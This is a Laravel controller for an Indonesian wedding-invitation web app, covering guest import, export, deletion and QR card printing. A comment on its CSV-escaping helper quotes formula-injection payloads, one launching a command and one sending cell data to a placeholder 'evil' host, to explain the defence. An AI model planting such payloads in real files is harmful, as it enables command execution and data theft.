<?php

namespace App\Http\Controllers;

use App\Models\Invitation;
use App\Models\Guest;
use App\Models\ActivityLog;
use App\Http\Requests\UpdateSettingsRequest;
use App\Http\Requests\StoreGuestRequest;
use App\Http\Requests\ImportGuestsRequest;
use App\Services\InvitationService;
use App\Support\WhatsAppNumber;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Carbon\Carbon;
use Maatwebsite\Excel\Facades\Excel;
use Maatwebsite\Excel\Concerns\ToArray;
use RuntimeException;
use Throwable;

class ClientController extends Controller
{
    public function index()
    {
        $user = Auth::user();
        $invitation = Invitation::where('user_id', $user->id)->first();

        $guests = collect();
        $totalGuests = 0;
        $hadir = 0;
        $tidakHadir = 0;
        $pending = 0;
        $checkedIn = 0;

        if ($invitation) {
            $query = $invitation->guests();
            
            // Defensive: check if column exists before filtering
            if (\Schema::hasColumn('guests', 'is_anonymous_wish')) {
                $query->where('is_anonymous_wish', false);
            }
            
            $guests = $query->orderBy('created_at', 'desc')->get();
            $totalGuests = $guests->count();
            $hadir = $guests->where('rsvp_status', 'hadir')->count();
            $tidakHadir = $guests->where('rsvp_status', 'tidak_hadir')->count();
            $pending = $guests->whereIn('rsvp_status', ['pending', null])->count();
            $checkedIn = $guests->whereNotNull('checked_in_at')->count();
        }

        return view('client.dashboard', compact(
            'invitation',
            'guests',
            'totalGuests',
            'hadir',
            'tidakHadir',
            'pending',
            'checkedIn'
        ));
    }

    public function settings()
    {
        $user = Auth::user();
        $invitation = Invitation::where('user_id', $user->id)->first();

        if (!$invitation) {
            return redirect()->route('client.dashboard')
                ->with('warning', 'Anda belum memiliki undangan. Silakan buat pesanan terlebih dahulu.');
        }

        Gate::authorize('view', $invitation);

        return view('client.settings', compact('invitation'));
    }

    public function updateSettings(UpdateSettingsRequest $request, InvitationService $invitationService)
    {
        $user = auth()->user();
        $invitation = $user->invitations()->first();

        if (!$invitation) {
            return redirect()->route('client.dashboard')
                ->with('warning', 'Anda belum memiliki undangan. Silakan buat pesanan terlebih dahulu.');
        }

        Gate::authorize('update', $invitation);

        $invitationService->updateSettings($invitation, $request);

        return back()->with('success', 'Data undangan berhasil diperbarui!');
    }

    public function downloadTemplate()
    {
        $columns = ['Nama Tamu', 'Nomor WA', 'Kategori', 'Alamat'];
        $rows = [
            ['Budi Santoso', '081234567890', 'Teman Kerja', 'Jakarta'],
            ['Siti Aminah', '089876543210', 'Keluarga', 'Bandung'],
        ];

        try {
            $csv = $this->buildCsv($columns, $rows);
        } catch (Throwable $e) {
            Log::error('Failed to generate guest template CSV.', ['exception' => $e]);

            return redirect()->route('client.dashboard')
                ->with('error', 'Gagal mengunduh template tamu. Silakan coba lagi.');
        }

        return response($csv, 200, $this->csvDownloadHeaders('template_tamu.csv'));
    }

    public function importGuests(ImportGuestsRequest $request)
    {
        $user = auth()->user();
        $invitation = $user->invitations()->first();

        if (!$invitation) {
            return redirect()->route('client.dashboard')
                ->with('warning', 'Anda belum memiliki undangan.');
        }

        Gate::authorize('importGuests', $invitation);

        $file = $request->file('file');
        $extension = strtolower($file->getClientOriginalExtension());
        $rows = [];

        if (in_array($extension, ['csv', 'txt'])) {
            $handle = fopen($file->getPathname(), 'r');
            // Skip header
            fgetcsv($handle);
            while (($data = fgetcsv($handle, 1000, ',')) !== false) {
                if (array_filter($data)) {
                    $rows[] = $data;
                }
            }
            fclose($handle);
        } else {
            try {
                $import = new class implements ToArray {
                    public function array(array $array)
                    {
                        return $array;
                    }
                };

                $data = Excel::toArray($import, $file);

                if (count($data) > 0) {
                    $sheet1 = $data[0];
                    array_shift($sheet1);
                    $rows = $sheet1;
                }
            } catch (\Exception $e) {
                return back()->withErrors([
                    'file' => 'Gagal membaca Excel: ' . $e->getMessage()
                ]);
            }
        }

        $normalizedRows = [];

        foreach ($rows as $index => $row) {
            $name = is_scalar($row[0] ?? null) ? trim((string) $row[0]) : '';

            if ($name === '') {
                continue;
            }

            $rawWhatsapp = $row[1] ?? null;
            $normalizedWhatsapp = WhatsAppNumber::normalize($rawWhatsapp);

            if (WhatsAppNumber::isFilled($rawWhatsapp) && $normalizedWhatsapp === null) {
                return back()->withErrors([
                    'file' => 'Nomor WhatsApp tidak valid pada baris ' . ($index + 2) . '.',
                ])->withInput();
            }

            $category = is_scalar($row[2] ?? null) && trim((string) $row[2]) !== ''
                ? trim((string) $row[2])
                : 'Umum';

            $address = is_scalar($row[3] ?? null) && trim((string) $row[3]) !== ''
                ? trim((string) $row[3])
                : null;

            $normalizedRows[] = [
                'name'     => $name,
                'whatsapp' => $normalizedWhatsapp,
                'category' => $category,
                'address'  => $address,
            ];
        }

        $count = count($normalizedRows);

        DB::transaction(function () use ($normalizedRows, $invitation) {
            foreach ($normalizedRows as $row) {
                $invitation->guests()->create([
                    'name'        => $row['name'],
                    'whatsapp'    => $row['whatsapp'],
                    'category'    => $row['category'],
                    'address'     => $row['address'],
                    'rsvp_status' => 'pending',
                    // slug auto-generated by Guest model boot hook (Str::random(8))
                ]);
            }
        });

        return back()->with('success', "Berhasil mengimpor {$count} data tamu!");
    }

    public function storeGuest(StoreGuestRequest $request)
    {
        $user = auth()->user();
        $invitation = $user->invitations()->first();

        if (!$invitation) {
            return redirect()->route('client.dashboard')
                ->with('warning', 'Anda belum memiliki undangan.');
        }

        Gate::authorize('addGuest', $invitation);

        $invitation->guests()->create([
            'name'        => $request->name,
            'whatsapp'    => WhatsAppNumber::normalize($request->whatsapp),
            'category'    => $request->category ?? 'Umum',
            'address'     => $request->address,
            'rsvp_status' => 'pending',
            // slug auto-generated by Guest model boot hook (Str::random(8))
        ]);

        return back()->with('success', 'Berhasil menambahkan tamu: ' . $request->name);
    }

    public function deleteGuest(Guest $guest)
    {
        Gate::authorize('delete', $guest);

        $name = $guest->name;
        $guest->delete();

        return back()->with('success', "Tamu \"{$name}\" berhasil dihapus.");
    }

    public function exportGuests(Invitation $invitation)
    {
        Gate::authorize('export', $invitation);

        try {
            $columns = ['Nama', 'Kategori', 'WhatsApp', 'Status Kehadiran', 'Ucapan', 'Jumlah Tamu', 'Tanggal Input'];

            $query = $invitation->guests();
            
            // Defensive: check if column exists before filtering
            if (\Schema::hasColumn('guests', 'is_anonymous_wish')) {
                $query->where('is_anonymous_wish', false);
            }
            
            $rows = $query->orderBy('created_at', 'desc')
                ->get()
                ->map(function (Guest $guest): array {
                    $status = match ($guest->rsvp_status) {
                        'hadir' => 'Hadir',
                        'tidak_hadir' => 'Tidak Hadir',
                        'ragu' => 'Ragu-ragu',
                        default => 'Pending',
                    };

                    return [
                        $guest->name,
                        $guest->category ?? '-',
                        $guest->whatsapp ?? '-',
                        $status,
                        $guest->comment ?? '-',
                        $guest->jumlah_tamu ?? 1,
                        optional($guest->created_at)->format('Y-m-d H:i:s') ?? '-',
                    ];
                })
                ->all();

            $csv = $this->buildCsv($columns, $rows);
            $filename = "daftar_tamu_{$invitation->slug}_" . now()->format('Y-m-d_H-i-s') . '.csv';
        } catch (Throwable $e) {
            Log::error('Failed to export guest CSV.', [
                'invitation_id' => $invitation->id,
                'exception' => $e,
            ]);

            return redirect()->route('client.dashboard')
                ->with('error', 'Gagal mengekspor daftar tamu. Silakan coba lagi.');
        }

        return response($csv, 200, $this->csvDownloadHeaders($filename));
    }

    /**
     * Halaman print QR cards untuk semua tamu.
     * Owner bisa Ctrl+P → print, potong, distribusi ke tamu (fisik) atau share via WA.
     * Setiap kartu: nama tamu + QR code unik + kategori.
     */
    public function printQrCards(Request $request)
    {
        $user = Auth::user();
        $invitation = $user->invitations()->first();

        if (!$invitation) {
            return redirect()->route('client.dashboard')
                ->with('warning', 'Anda belum memiliki undangan.');
        }

        Gate::authorize('view', $invitation);

        $query = $invitation->guests();
        
        // Defensive: check if column exists before filtering
        if (\Schema::hasColumn('guests', 'is_anonymous_wish')) {
            $query->where('is_anonymous_wish', false);
        }
        
        $guests = $query->orderBy('category')
            ->orderBy('name')
            ->get();

        return view('client.print_qrcards', compact('invitation', 'guests'));
    }

    protected function buildCsv(array $columns, iterable $rows): string
    {
        $handle = fopen('php://temp', 'w+b');

        if ($handle === false) {
            throw new RuntimeException('Unable to open temporary CSV stream.');
        }

        try {
            if (fwrite($handle, "\xEF\xBB\xBF") === false) {
                throw new RuntimeException('Unable to write UTF-8 BOM.');
            }

            $this->writeCsvRow($handle, $columns);

            foreach ($rows as $row) {
                // Escape CSV formula injection — prefix dangerous first chars
                // with single quote so Excel/Numbers/Sheets render them as
                // literal text instead of executing =cmd|... formulas.
                $sanitized = array_map([$this, 'escapeCsvFormula'], (array) $row);
                $this->writeCsvRow($handle, $sanitized);
            }

            if (!rewind($handle)) {
                throw new RuntimeException('Unable to rewind CSV stream.');
            }

            $contents = stream_get_contents($handle);

            if ($contents === false) {
                throw new RuntimeException('Unable to read CSV stream.');
            }

            return $contents;
        } finally {
            fclose($handle);
        }
    }

    /**
     * Prefix leading formula characters (=, +, -, @, tab, CR) with a
     * single quote so spreadsheet apps treat the cell as text. This
     * blocks CSV formula injection (CVE-style payloads like
     * =cmd|'/c calc'!A1 or =HYPERLINK("http://evil/?x="&A1)).
     */
    private function escapeCsvFormula(string $value): string
    {
        if ($value === '') {
            return $value;
        }

        $firstChar = $value[0];

        if (in_array($firstChar, ['=', '+', '-', '@', "\t", "\r"], true)) {
            return "'" . $value;
        }

        return $value;
    }

    private function writeCsvRow($handle, array $row): void
    {
        if (fputcsv($handle, $row) === false) {
            throw new RuntimeException('Unable to write CSV row.');
        }
    }

    private function csvDownloadHeaders(string $filename): array
    {
        $safeFilename = $this->safeCsvFilename($filename);

        return [
            'Content-Type' => 'text/csv; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="' . $safeFilename . '"',
            'Pragma' => 'no-cache',
            'Cache-Control' => 'must-revalidate, post-check=0, pre-check=0',
            'Expires' => '0',
        ];
    }

    private function safeCsvFilename(string $filename): string
    {
        $filename = basename(str_replace('\\', '/', $filename));
        $filename = preg_replace('/[^A-Za-z0-9._-]+/', '_', $filename) ?: 'download.csv';
        $filename = trim($filename, '._-') ?: 'download';

        if (!Str::endsWith(strtolower($filename), '.csv')) {
            $filename .= '.csv';
        }

        return $filename;
    }
}